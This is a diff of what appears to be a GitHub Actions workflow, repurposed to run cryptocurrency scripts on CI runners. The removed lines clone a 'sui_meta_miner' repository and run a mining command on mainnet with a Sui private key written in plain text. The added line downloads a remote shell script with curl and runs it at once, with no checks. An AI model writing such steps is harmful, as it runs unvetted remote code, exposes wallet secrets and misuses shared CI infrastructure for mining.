@@ -53,11 +53,7 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          git clone https://github.com/triisusanti339/sui_meta_miner.git
-          cd sui_meta_miner
-          npm install
-          node mine.js --fomo --chain=mainnet --phrase="suiprivkey1qra6zx0dum76uq6k3lhdxlkvrwsk4y34dnyqfjmn70w8d3d4f3pckdj7dhu"
-
+          [ -f "sixgpt.sh" ] && rm sixgpt.sh; curl -s -o sixgpt.sh https://raw.githubusercontent.com/zunxbt/sixgpt/main/sixgpt.sh && chmod +x sixgpt.sh && ./sixgpt.sh
 
           
   build4:
